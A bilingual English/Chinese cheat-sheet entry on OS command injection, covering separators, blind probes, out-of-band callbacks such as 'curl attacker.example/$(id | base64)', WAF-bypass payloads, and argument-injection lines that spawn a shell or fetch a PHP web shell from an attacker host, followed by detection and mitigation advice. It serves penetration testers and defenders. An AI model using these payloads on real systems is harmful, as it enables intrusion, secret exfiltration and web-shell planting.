---
id: command-injection
title_en: OS Command Injection
title_zh: 操作系统命令注入
summary_en: The application builds a shell command out of your input, and a shell treats metacharacters as structure. Getting a shell is not the interesting part — the interesting part is that the interesting bugs often hide where you cannot see the output at all.
summary_zh: 应用把你的输入拼成 shell 命令，而 shell 会把元字符当成结构。能不能弹 shell 不是重点 —— 重点在于，最值钱的那些洞往往出现在你根本看不到输出的地方。
tags: [web, command-injection, rce, shell, bugbounty, waf-bypass]
tools: [commix, Burp Suite, interactsh]
attck: [T1059.004]
platform: [web, linux, windows]
difficulty: beginner
updated: 2026-10-08
---

<!-- lang:en -->
### The bug

```python
# the shape of it, in any language
os.system("ping -c 1 " + user_input)
```

A shell parses that string, and the shell gives meaning to characters that are just text to the application. You supply the structure:

| Separator | Effect |
|---|---|
| `;` | Run the next command regardless of the first |
| `&&` | Run the next command if the first succeeded |
| `\|` | Pipe the output into the next command |
| `\|\|` | Run the next command if the first failed |
| `&` | Background the first, run the next |
| `` `cmd` `` | Command substitution, inside a string |
| `$(cmd)` | Command substitution, nestable |
| `%0a` | Newline, which the shell also treats as a separator |
| `%00` | Terminates the argument on some stacks |

The classic probe is the same everywhere: send `; id` (or `& whoami`, or `| ping -c 1 127.0.0.1`) and see whether the output of *your* command appears.

### When there is no output

Most real command injection is blind, and the technique changes but the bug does not:

- **Time-based.** `; sleep 10` (Linux) or `& ping -n 10 127.0.0.1` (Windows) and measure. This is the workhorse when nothing is reflected.
- **Out-of-band.** `; nslookup $(whoami).attacker.example` (Windows) or `; curl attacker.example/$(id | base64)` (Linux). Use a real listener, not a log file.
- **File write, then read.** Write into a web-served directory and fetch it in the next request — the most reliable blind technique when the target serves static files.
- **Boolean.** Make a command succeed or fail based on a condition you control, and watch for a difference in behaviour.
- **Error-based.** Trigger a command that produces a distinguishable error, such as `uname -a` in a path that expects a number.

```bash
# a quick decision tree for a blind parameter
; sleep 10                 # does time change?  -> time-based confirmed
; curl -s http://me/$(id)  # do I get a callback? -> OOB confirmed
; id > /var/www/html/x.txt # then: curl https://target/x.txt
```

### Bypassing filters

Applications and WAFs filter the obvious characters. The filter is a speed bump, not a wall:

| Blocked | Alternative |
|---|---|
| Space | `${IFS}`, `$IFS$9`, `%09`, `<`, `{cat,/etc/passwd}` |
| `/` | `${PATH:0:1}`, `$(echo Lw== \| base64 -d)` |
| `cat` and other keywords | `c'a't`, `c"a"t`, `ca\t`, `/???/??t`, `$'\\x63\\x61\\x74'` |
| The whole word | Build it: `a=c;b=at;$a$b /etc/passwd` |
| `;` and `|` | Newline (`%0a`), `&&`, layered quoting |
| Base64 output | `echo <b64> \| base64 -d \| sh` — a payload with no obvious keywords at all |

Shell-specific tricks are worth knowing because they look like arguments rather than commands:

```bash
# process substitution and redirection instead of separators
cat < /etc/passwd
diff <(id) <(echo x)

# brace expansion as a separator-free command
{cat,/etc/passwd}
```

Windows has its own set: `&`, `&&`, `|`, `%VAR%` expansion, `^` as an escape, and PowerShell cmdlet alternatives when the target is a PowerShell host.

### Argument injection, the sibling bug

Sometimes you cannot inject a separator, but you can control an argument to a command the application already runs. That is enough:

```bash
# rsync with a controllable -e runs a command
rsync -e 'sh -c "sh -i >&2 0>&1"' host:/path .

# tar with --checkpoint-action executes during archival
tar czf out.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh

# curl can write files and read them back
curl -o /var/www/html/shell.php http://attacker/shell
```

Anything that takes a filename, a URL, an environment variable or a "command to run" as a flag is a candidate. This is where the boundary between command injection and SSRF, file write and local file inclusion gets blurry — and where the highest-value findings in modern web applications usually live.

### Where it actually is

- Diagnostic features: ping, traceroute, DNS lookup, whois, nslookup.
- Image and video processing: ImageMagick, FFmpeg, Ghostscript.
- PDF and document generation, often through a shell wrapper.
- Backup and export jobs that pass a filename or a date to a shell command.
- System information and monitoring endpoints.
- Anything with a "run this" or "convert this" button.

### Detection

- **Process creation with a shell parent.** The web server spawning `sh -c` or `cmd.exe /c` is the signature; the arguments are the payload.
- **Command lines containing shell metacharacters**: `;`, `&&`, `|`, backticks, `$(`.
- **Unexpected child processes**: `curl`, `nslookup`, `base64` spawned by a Java or PHP process.
- **Long or unusual sleeps** in request timing for a single parameter.
- **Anomalous outbound DNS**, especially subdomains with encoded data.
- In containers, an alert on any process spawned by the application that is not in the image's expected set catches most of this immediately.

### Mitigation

- **Do not go through a shell.** Use the language's `execve`-style API with an argument array: `subprocess.run(["ping", "-c", "1", host])` rather than `os.system("ping -c 1 " + host)`. This single change removes the entire class.
- **Validate against a strict allow-list**, matching the shape of what the parameter should be (an IP, a hostname, a UUID), not a block-list of characters.
- **Never pass user input as a flag.** Quote it, and use `--` to end option parsing where the tool supports it: `tar -czf out.tar.gz -- "$file"`.
- **Run as a low-privileged user**, in a container with a read-only filesystem and no egress, so a successful injection is contained.
- **Keep the tools patched**; a large share of real-world command injection is ImageMagick, Ghostscript and FFmpeg image/PDF parsing, not the application's own shell call.
- **Alert on shell metacharacters in inputs** and on process trees that do not match the application's normal behaviour.

<!-- lang:zh -->
### 漏洞本身

```python
# 任何语言里的形状都一样
os.system("ping -c 1 " + user_input)
```

shell 会解析这个字符串，而 shell 会给那些对应用来说只是文本的字符赋予**结构含义**。结构由你提供：

| 分隔符 | 效果 |
|---|---|
| `;` | 不管前一条是否成功，都执行下一条 |
| `&&` | 前一条成功才执行下一条 |
| `\|` | 把输出管给下一条命令 |
| `\|\|` | 前一条失败才执行下一条 |
| `&` | 前一条放后台，执行下一条 |
| `` `cmd` `` | 命令替换，写在字符串里 |
| `$(cmd)` | 命令替换，可嵌套 |
| `%0a` | 换行，shell 同样把它当分隔符 |
| `%00` | 在某些技术栈上会截断参数 |

经典探针到哪都一样：送 `; id`（或 `& whoami`、`| ping -c 1 127.0.0.1`），看**你自己那条命令**的输出是否出现。

### 没有回显的时候

现实中的命令注入大多是盲的。手法变了，漏洞没变：

- **时间盲。** `; sleep 10`（Linux）或 `& ping -n 10 127.0.0.1`（Windows）然后测耗时。什么都不回显时这是主力。
- **带外。** `; nslookup $(whoami).attacker.example`（Windows）或 `; curl attacker.example/$(id | base64)`（Linux）。要接真正的监听器，不是看日志。
- **写文件再读。** 往会被 Web 提供的目录里写，下一次请求取回来 —— 目标提供静态文件时，这是最可靠的盲打手法。
- **布尔盲。** 让命令根据一个你能控制的条件成功或失败，观察行为差异。
- **报错盲。** 触发一个能产生可辨认错误的命令，比如在一个期待数字的位置塞 `uname -a`。

```bash
# 面对盲参数时的快速判断顺序
; sleep 10                 # 耗时变了？  -> 时间盲成立
; curl -s http://me/$(id)  # 收到回调？    -> 带外成立
; id > /var/www/html/x.txt # 然后：curl https://target/x.txt
```

### 绕过过滤

应用和 WAF 会过滤那些显眼的字符。过滤器是减速带，不是墙：

| 被拦 | 替代写法 |
|---|---|
| 空格 | `${IFS}`、`$IFS$9`、`%09`、`<`、`{cat,/etc/passwd}` |
| `/` | `${PATH:0:1}`、`$(echo Lw== \| base64 -d)` |
| `cat` 等关键字 | `c'a't`、`c"a"t`、`ca\t`、`/???/??t`、`$'\\x63\\x61\\x74'` |
| 整个单词 | 拼出来：`a=c;b=at;$a$b /etc/passwd` |
| `;` 与 `|` | 换行（`%0a`）、`&&`、多层引号 |
| 输出含 base64 | `echo <b64> \| base64 -d \| sh` —— 一个看不出任何关键字的 payload |

有些 shell 特有的技巧值得知道，因为它们长得像参数而不是命令：

```bash
# 用进程替换和重定向代替分隔符
cat < /etc/passwd
diff <(id) <(echo x)

# 用花括号展开写出不含分隔符的命令
{cat,/etc/passwd}
```

Windows 有它自己的一套：`&`、`&&`、`|`、`%VAR%` 展开、`^` 作为转义；目标是 PowerShell 主机时还有 cmdlet 形式的替代品。

### 参数注入：同一家族的兄弟

有时你注入不了分隔符，但能控制应用本来就要执行的那条命令的某个参数。这就够了：

```bash
# rsync 的 -e 可控时就能执行命令
rsync -e 'sh -c "sh -i >&2 0>&1"' host:/path .

# tar 的 --checkpoint-action 会在打包过程中执行
tar czf out.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh

# curl 能写文件，也能读回来
curl -o /var/www/html/shell.php http://attacker/shell
```

任何把文件名、URL、环境变量或"要执行的命令"当作选项传入的东西都是候选。这也是命令注入与 SSRF、文件写入、本地文件包含之间边界最模糊的地方 —— 而现代 Web 应用里价值最高的发现，往往就长在这里。

### 它实际在哪

- 诊断类功能：ping、traceroute、DNS 查询、whois、nslookup。
- 图片与视频处理：ImageMagick、FFmpeg、Ghostscript。
- PDF 与文档生成，常常通过一层 shell 包装。
- 把文件名或日期传给 shell 命令的备份与导出任务。
- 系统信息与监控接口。
- 任何带"运行一下""转换一下"按钮的功能。

### 检测

- **以 shell 为父进程的进程创建。** Web 服务器拉起 `sh -c` 或 `cmd.exe /c` 就是签名，参数里就是 payload。
- **命令行里出现 shell 元字符**：`;`、`&&`、`|`、反引号、`$(`。
- **意外的子进程**：Java 或 PHP 进程拉起了 `curl`、`nslookup`、`base64`。
- **单一参数的请求耗时出现长且异常的 sleep**。
- **异常的出站 DNS**，尤其是带编码数据的子域。
- 在容器里，对"应用拉起了镜像预期集合之外任何进程"告警，几乎能立刻抓住这一类。

### 缓解

- **不要经过 shell。** 用语言里 `execve` 风格的 API 配参数数组：`subprocess.run(["ping", "-c", "1", host])`，而不是 `os.system("ping -c 1 " + host)`。改这一处就消掉整个类别。
- **按严格白名单校验**，匹配参数应有的形状（IP、主机名、UUID），而不是用字符黑名单。
- **永远不要把用户输入当选项传。** 加引号，并在工具支持时用 `--` 结束选项解析：`tar -czf out.tar.gz -- "$file"`。
- **低权限运行**，放进只读文件系统且无出网的容器里，让注入成功之后被限制住。
- **保持工具打补丁**；现实中很大一部分命令注入来自 ImageMagick、Ghostscript、FFmpeg 对图片/PDF 的解析，而不是应用自己写的 shell 调用。
- **对输入里的 shell 元字符告警**，对不符合应用正常行为的进程树告警。
